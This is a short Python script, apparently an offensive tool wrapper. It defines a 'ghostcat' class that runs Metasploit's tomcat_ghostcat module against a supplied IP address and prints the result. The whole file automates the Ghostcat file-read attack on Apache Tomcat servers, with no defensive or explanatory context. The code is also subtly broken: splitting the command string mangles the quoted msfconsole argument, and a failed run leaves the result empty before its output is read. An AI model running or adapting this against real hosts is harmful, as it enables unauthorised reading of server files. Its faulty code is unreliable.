import subprocess

class ghostcat:
    def __init__(self, ip):
        self.ip = ip
    
    def run_command(self, cmd):
        try:
            # result = subprocess.run(cmd.split(), check=True, shell=True, capture_output=True, text=True)
            result = subprocess.run(cmd.split(), check=True, capture_output=True, text=True)
            return result
        except Exception as e:
            print(f"Failed to run command {cmd}.\nException: {e}")
    
    def run(self):
        print("Start executing")
        cmd = f"msfconsole -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS {self.ip}; run; exit'"
        result = self.run_command(cmd)
        print("Finished executing")
        # Scrape output for knownn vulnerabilities
        output = result.stdout
        print(output)
        return output